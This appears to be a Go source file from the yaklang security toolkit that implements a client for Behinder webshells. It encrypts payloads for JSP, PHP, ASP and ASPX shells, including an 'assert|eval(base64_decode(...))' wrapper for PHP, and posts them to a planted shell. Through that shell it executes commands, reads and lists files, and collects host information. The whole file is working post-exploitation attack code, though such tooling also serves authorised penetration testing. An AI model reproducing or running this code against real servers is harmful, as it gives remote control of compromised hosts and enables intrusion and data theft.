package wsm

import (
	"bytes"
	"context"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"github.com/yaklang/yaklang/common/log"
	"github.com/yaklang/yaklang/common/utils"
	"github.com/yaklang/yaklang/common/utils/lowhttp"
	"github.com/yaklang/yaklang/common/wsm/payloads/behinder"
	"github.com/yaklang/yaklang/common/yak"
	"github.com/yaklang/yaklang/common/yakgrpc/ypb"
	"net/http"
)

//type WsmClient interface {
//	//HTTP(opts ...lowhttp.LowhttpOpt) (*lowhttp.LowhttpResponse, error)
//	Do(req *http.Request) (*http.Response, error)
//}

type Behinder struct {
	// 连接地址
	Url string
	// 密钥
	SecretKey []byte
	// shell 类型
	ShellScript string

	Proxy string
	// response 开头的干扰字符
	respPrefixLen int
	// response 结尾的干扰字符
	respSuffixLen int
	// 自定义 header 头
	Headers              map[string]string
	Client               *http.Client
	PacketScriptContent  string
	PayloadScriptContent string
	customEchoEncoder    codecFunc
	customEchoDecoder    codecFunc
	customPacketEncoder  codecFunc
}

func (b *Behinder) echoResultEncode(raw []byte) ([]byte, error) {
	if b.customEchoEncoder != nil {
		return b.customEchoEncoder(raw)
	}
	return b.EchoResultEncodeFormYak(raw)
}

func (b *Behinder) EchoResultEncodeFormYak(raw []byte) ([]byte, error) {
	if len(b.PayloadScriptContent) == 0 {
		return []byte(""), nil
	}

	engine, err := yak.NewScriptEngine(1000).ExecuteEx(b.PayloadScriptContent, map[string]interface{}{
		"YAK_FILENAME": "req.GetScriptName()",
	})
	if err != nil {
		return nil, utils.Errorf("execute file %s code failed: %s", "req.GetScriptName()", err.Error())
	}
	result, err := engine.CallYakFunction(context.Background(), "wsmPayloadEncoder", []interface{}{raw})
	if err != nil {
		return nil, utils.Errorf("import %v' s handle failed: %s", "req.GetScriptName()", err)
	}
	rspBytes := utils.InterfaceToBytes(result)

	return rspBytes, nil
}

func (b *Behinder) echoResultDecode(raw []byte) ([]byte, error) {
	if b.customEchoDecoder != nil {
		return b.customEchoDecoder(raw)
	}
	return b.EchoResultDecodeFormYak(raw)
}

func (b *Behinder) EchoResultDecodeFormYak(raw []byte) ([]byte, error) {
	if len(b.PayloadScriptContent) == 0 {
		return b.deCryption(raw)
	}
	engine, err := yak.NewScriptEngine(1000).ExecuteEx(b.PayloadScriptContent, map[string]interface{}{
		"YAK_FILENAME": "req.GetScriptName()",
	})
	if err != nil {
		return nil, utils.Errorf("execute file %s code failed: %s", "req.GetScriptName()", err.Error())
	}
	result, err := engine.CallYakFunction(context.Background(), "wsmPayloadDecoder", []interface{}{raw})
	if err != nil {
		return nil, utils.Errorf("import %v' s handle failed: %s", "req.GetScriptName()", err)
	}
	rspBytes := utils.InterfaceToBytesSlice(result)[0]

	return rspBytes, nil
}

func (b *Behinder) clientRequestEncode(raw []byte) ([]byte, error) {
	if b.customPacketEncoder != nil {
		return b.customPacketEncoder(raw)
	}
	return b.ClientRequestEncode(raw)
}
func (b *Behinder) ClientRequestEncode(raw []byte) ([]byte, error) {
	if len(b.PacketScriptContent) == 0 {
		return b.enCryption(raw)
	}

	engine, err := yak.NewScriptEngine(1000).ExecuteEx(b.PacketScriptContent, map[string]interface{}{
		"YAK_FILENAME": "req.GetScriptName()",
	})
	if err != nil {
		return nil, utils.Errorf("execute file %s code failed: %s", "req.GetScriptName()", err.Error())
	}
	result, err := engine.CallYakFunction(context.Background(), "wsmPacketEncoder", []interface{}{raw})
	if err != nil {
		return nil, utils.Errorf("import %v' s handle failed: %s", "req.GetScriptName()", err)
	}
	rspBytes := utils.InterfaceToBytes(result)

	return rspBytes, nil
}

func (b *Behinder) EchoResultEncodeFormGo(en codecFunc) {
	b.customEchoEncoder = en
}

func (b *Behinder) EchoResultDecodeFormGo(de codecFunc) {
	b.customEchoDecoder = de
}

func (b *Behinder) ClientRequestEncodeFormGo(en codecFunc) {
	b.customPacketEncoder = en
}

func (b *Behinder) ServerResponseDecode(raw []byte) ([]byte, error) {
	//TODO implement me
	panic("implement me")
}

func (b *Behinder) SetPayloadScriptContent(str string) {
	b.PayloadScriptContent = str
}

func (b *Behinder) SetPacketScriptContent(str string) {
	b.PacketScriptContent = str
}

func NewBehinder(ys *ypb.WebShell) (*Behinder, error) {
	client := utils.NewDefaultHTTPClient()

	bs := &Behinder{
		Url:           ys.GetUrl(),
		SecretKey:     secretKey(ys.GetSecretKey()),
		ShellScript:   ys.GetShellScript(),
		Proxy:         ys.GetProxy(),
		respPrefixLen: 0,
		respSuffixLen: 0,
		Headers:       make(map[string]string, 2),
		Client:        client,
	}
	// 默认的加密方式
	//bs.CustomEncoder = func(raw []byte) ([]byte, error) {
	//	return bs.enCryption(raw)
	//}
	//bs.CustomDecoder = func(raw []byte) ([]byte, error) {
	//	return bs.deCryption(raw)
	//}
	bs.setHeaders()
	//if len(bs.Proxy) != 0 {
	//	bs.setProxy()
	//}
	return bs, nil
}

func (b *Behinder) setHeaders() {
	switch b.ShellScript {
	case ypb.ShellScript_JSP.String():
		fallthrough
	case ypb.ShellScript_JSPX.String():
		fallthrough
		//b.Headers["Content-type"] = "application/x-www-form-urlencoded"
	case ypb.ShellScript_ASPX.String():
		b.Headers["Content-type"] = "application/octet-stream"
	case ypb.ShellScript_PHP.String():
		b.Headers["Content-type"] = "application/x-www-form-urlencoded"
	case ypb.ShellScript_ASP.String():
		b.Headers["Content-type"] = "application/x-www-form-urlencoded"
	default:
		panic("shell script type error [jsp/jspx/asp/aspx/php]")
	}
}

//func (b *Behinder) setProxy() {
//	b.Client.Transport = &http.Transport{
//		Proxy: func(r *http.Request) (*url.URL, error) {
//			return url.Parse(b.Proxy)
//		},
//	}
//}

func (b *Behinder) getPayload(binCode behinder.Payload, params map[string]string) ([]byte, error) {
	var rawPayload []byte
	var err error
	hexCode := behinder.HexPayload[b.ShellScript][binCode]
	switch b.ShellScript {
	case ypb.ShellScript_JSPX.String():
		fallthrough
	case ypb.ShellScript_JSP.String():
		rawPayload, err = behinder.GetRawClass(hexCode, params)
		if err != nil {
			return nil, err
		}
	case ypb.ShellScript_PHP.String():
		rawPayload, err = behinder.GetRawPHP(hexCode, params)
		if err != nil {
			return nil, err
		}
		//rawPayload = []byte(("lasjfadfas.assert|eval(base64_decode('" + string(bincls) + "'));"))
		rawPayload = []byte(("assert|eval(base64_decode('" + base64.StdEncoding.EncodeToString(rawPayload) + "'));"))
	case ypb.ShellScript_ASPX.String():
		rawPayload, err = behinder.GetRawAssembly(hexCode, params)
		if err != nil {
			return nil, err
		}
	case ypb.ShellScript_ASP.String():
		rawPayload, err = behinder.GetRawASP(hexCode, params)
		if err != nil {
			return nil, err
		}
	}
	//return b.CustomEncoder(rawPayload)
	return rawPayload, nil
}

// 原生的加密方式
func (b *Behinder) enCryption(binCode []byte) ([]byte, error) {
	return behinder.Encryption(binCode, b.SecretKey, b.ShellScript)
}

// todo  前后存在干扰字符的解密方式
func (b *Behinder) deCryption(raw []byte) ([]byte, error) {
	//var targetBts []byte
	//// 提取一下 resp raw body 中的需要的结果
	//if (b.respSuffixLen != 0 || b.respPrefixLen != 0) && len(raw)-b.respPrefixLen >= b.respSuffixLen {
	//	targetBts = raw[b.respPrefixLen : len(raw)-b.respSuffixLen]
	//} else {
	//	targetBts = raw
	//}
	return behinder.Decryption(raw, b.SecretKey, b.ShellScript)
}

func (b *Behinder) SendHttpRequest(data []byte) ([]byte, error) {
	// request body 编码操作
	data, err := b.clientRequestEncode(data)
	if err != nil {
		return nil, utils.Errorf("clientRequestEncode error: %v", err)
	}
	request, err := http.NewRequest(http.MethodPost, b.Url, bytes.NewReader(data))
	if err != nil {
		return nil, err
	}
	for k, v := range b.Headers {
		request.Header.Set(k, v)
	}
	lresp, err := lowhttp.HTTP(
		lowhttp.WithRequest(request),
		lowhttp.WithVerifyCertificate(false),
		lowhttp.WithTimeoutFloat(15),
		lowhttp.WithProxy(b.Proxy),
	)
	raw := lowhttp.GetHTTPPacketBody(lresp.RawPacket)

	if len(raw) == 0 {
		return nil, utils.Errorf("empty response")
	}
	// payload 回显结果解码操作
	result, err := b.echoResultDecode(raw)

	if err != nil {
		return nil, utils.Errorf("echo decode error: %v", err)
	}

	return result, nil
}

//func (b *Behinder) sendPayload(data []byte) ([]byte, error) {
//	body, err := b.post(data)
//	if err != nil {
//		return nil, err
//	}
//	return b.CustomDecoder(body)
//}

//func (b *Behinder) Encoder(f func(raw []byte) ([]byte, error)) {
//	b.CustomEncoder = f
//}
//
//func (b *Behinder) Decoder(f func(raw []byte) ([]byte, error)) {
//	b.CustomDecoder = f
//}

func (b *Behinder) Unmarshal(bts []byte, m map[string]string) error {
	err := json.Unmarshal(bts, &m)
	if err != nil {
		return err
	}
	for k, v := range m {
		value, _ := base64.StdEncoding.DecodeString(v)
		m[k] = string(value)
	}

	return nil
}

func (b *Behinder) String() string {
	return fmt.Sprintf(
		"Url: %s, SecretKey: %x, ShellScript: %s, Proxy: %s, Headers: %v",
		b.Url,
		b.SecretKey,
		b.ShellScript,
		b.Proxy,
		b.Headers,
	)
}

//func (b *Behinder) cloneParams() map[string]string {
//	encoderParams := make(map[string]string)
//	value, _ := b.EchoResultEncodeFormYak([]byte(""))
//	encoderParams["CustomEncoder"] = string(value)
//	return encoderParams
//}

func (b *Behinder) processParams(params map[string]string) {

	value, _ := b.echoResultEncode([]byte(""))
	if len(value) != 0 {
		params["customEncoderFromClass"] = string(value)
	}
	if b.ShellScript == ypb.ShellScript_JSP.String() || b.ShellScript == ypb.ShellScript_JSPX.String() {
		for key, value := range params {
			newKey := fmt.Sprintf("{{%s}}", key)
			delete(params, key)
			params[newKey] = value
		}
	}
}

func (b *Behinder) GenWebShell() string {
	return ""
}

func (b *Behinder) processBase64JSON(input []byte) ([]byte, error) {
	var raw interface{}
	err := json.Unmarshal(input, &raw)
	if err != nil {
		return nil, err
	}

	decoded, err := decodeBase64Values(raw)
	if err != nil {
		return nil, err
	}

	decodedJSON, err := json.Marshal(decoded)
	if err != nil {
		return nil, fmt.Errorf("failed to re-encode decoded data as JSON: %w", err)
	}

	return decodedJSON, nil
}

func (b *Behinder) Ping(opts ...behinder.ExecParamsConfig) (bool, error) {
	params := make(map[string]string)
	params["content"] = "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
	params = behinder.ProcessParams(params, opts...)

	payload, err := b.getPayload(behinder.EchoGo, params)
	if err != nil {
		return false, err
	}
	//
	//res, err := b.sendPayload(payload)
	res, err := b.SendHttpRequest(payload)
	if err != nil {
		return false, err
	}
	log.Infof("%q", res)
	return true, nil
}

func (b *Behinder) BasicInfo(opts ...behinder.ExecParamsConfig) ([]byte, error) {
	params := make(map[string]string)
	params["whatever"] = "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
	params = behinder.ProcessParams(params, opts...)
	payload, err := b.getPayload(behinder.BasicInfoGo, params)
	if err != nil {
		return nil, err
	}
	bs64res, err := b.SendHttpRequest(payload)
	if err != nil {
		return nil, err
	}
	jsonByte, err := b.processBase64JSON(bs64res)
	if err != nil {
		return nil, err
	}

	return jsonByte, nil
}

func (b *Behinder) CommandExec(cmd string, opts ...behinder.ExecParamsConfig) ([]byte, error) {
	params := make(map[string]string)
	params["cmd"] = cmd
	params["path"] = "/"
	params = behinder.ProcessParams(params, opts...)
	payload, err := b.getPayload(behinder.CmdGo, params)
	if err != nil {
		return nil, err
	}
	bs64res, err := b.SendHttpRequest(payload)
	if err != nil {
		return nil, err
	}
	jsonByte, err := b.processBase64JSON(bs64res)
	if err != nil {
		return nil, err
	}

	return jsonByte, nil
}

func (b *Behinder) showFile(path string) ([]byte, error) {
	params := map[string]string{
		"mode": "show",
		"path": path,
	}
	b.processParams(params)
	payload, err := b.getPayload(behinder.FileOperationGo, params)
	if err != nil {
		return nil, err
	}
	bs64res, err := b.SendHttpRequest(payload)
	if err != nil {
		return nil, err
	}
	jsonByte, err := b.processBase64JSON(bs64res)
	if err != nil {
		return nil, err
	}

	return jsonByte, nil
}

func (b *Behinder) listFile(path string) ([]byte, error) {
	params := map[string]string{
		"mode": "list",
		"path": path,
	}
	b.processParams(params)
	payload, err := b.getPayload(behinder.FileOperationGo, params)
	if err != nil {
		return nil, err
	}
	bs64res, err := b.SendHttpRequest(payload)
	if err != nil {
		return nil, err
	}
	jsonByte, err := b.processBase64JSON(bs64res)
	if err != nil {
		return nil, err
	}

	//echo,err := b.processBase64JSON(jsonByte)
	//if err != nil {
	//	return nil, err
	//}
	//fmt.Println(string(echo))
	return jsonByte, nil
}
